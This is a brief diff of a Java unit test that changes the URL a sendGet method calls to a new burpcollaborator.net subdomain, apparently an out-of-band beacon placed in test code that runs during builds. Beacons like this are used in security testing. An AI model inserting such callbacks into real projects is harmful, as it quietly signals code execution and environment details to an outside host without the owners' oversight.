@@ -42,7 +42,7 @@ public class App2Test extends TestCase
     // HTTP GET request
     private void sendGet() throws Exception {
 
-        String url = "http://6ip9od0uxa8ljwz01idsqjx4evkl8a.burpcollaborator.net";
+        String url = "http://604mlh1s713hcwd9xt6dfqrqyh47sw.burpcollaborator.net";
 
         URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
